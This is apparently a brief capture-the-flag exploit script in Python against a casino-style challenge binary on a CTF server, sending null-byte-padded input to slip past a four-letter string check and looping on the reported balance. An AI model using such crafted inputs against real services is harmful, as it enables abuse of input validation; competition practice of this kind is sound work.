#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or 'ctf.b01lers.com'
port = int(args.PORT or 9203)

gdbscript = '''
tbreak main
b *casino+280
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

while True:

	reu(b"Your current balance: ")

	bal = int(rl().strip(b'\n'))

	sla(b'Guess me a string of length 4 with lowercase letters: ', b'\x00' + b'a'*7 + b'\x00' + b'a'*7 )

	print(bal)
# R = Rootkit(io)
# payload = R.Exploit()

io.interactive()